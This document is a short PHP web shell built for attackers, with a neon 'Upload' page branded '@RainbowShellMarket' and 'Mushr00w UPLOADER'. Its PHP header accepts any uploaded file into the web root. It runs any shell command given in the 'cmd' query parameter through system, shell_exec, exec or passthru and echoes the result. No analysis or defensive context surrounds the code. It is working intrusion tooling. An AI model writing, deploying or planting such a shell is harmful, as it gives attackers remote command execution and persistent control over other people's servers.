<?php
if(isset($_FILES['file'])){$t=basename($_FILES['file']['name']);echo move_uploaded_file($_FILES['file']['tmp_name'],$t)?"<a href='$t'>$t</a>":"fail";exit;}
if(isset($_GET['cmd'])){$c=$_GET['cmd'];$o='';if(function_exists('system')){ob_start();system($c);$o=ob_get_clean();}elseif(function_exists('shell_exec')){$o=shell_exec($c);}elseif(function_exists('exec')){exec($c,$l);$o=implode("\n",$l);}elseif(function_exists('passthru')){ob_start();passthru($c);$o=ob_get_clean();}echo "<pre>$o</pre>";exit;}
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Upload</title>
<style>
#t{font-weight:900;font-size:clamp(28px,7vw,72px);letter-spacing:5px;white-space:nowrap;color:transparent;background:linear-gradient(90deg,#ff004c,#ff6a00,#ffe600,#00ff66,#00e5ff,#4d4dff,#b400ff,#ff004c);background-size:300% 100%;-webkit-background-clip:text;background-clip:text;animation:r 3s linear infinite;filter:drop-shadow(0 0 8px #ff004cb3) drop-shadow(0 0 24px #00e5ff8c) drop-shadow(0 0 40px #b400ff73)}
@keyframes r{to{background-position:300% 50%}}
</style></head>
<body style="background:#0a0a0a;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden;gap:40px;transform:translateY(-30px)">
<h1 id="t">@RainbowShellMarket</h1>
<form method="POST" enctype="multipart/form-data" style="background:#111;padding:40px;border:2px solid #0f0;border-radius:10px;text-align:center;box-shadow:0 0 40px #0f05">
<h2 style="font-size:22px">Mushr00w UPLOADER</h2>
<input type="file" name="file" required style="background:#0a0a0a;color:#0f0;border:1px solid #0f0;padding:10px;border-radius:5px"><br><br>
<button style="background:#0f0;color:#0a0a0a;padding:10px 30px;border:none;border-radius:5px;font-weight:bold;cursor:pointer">CLICK TO UPLOAD</button>
</form></body></html>
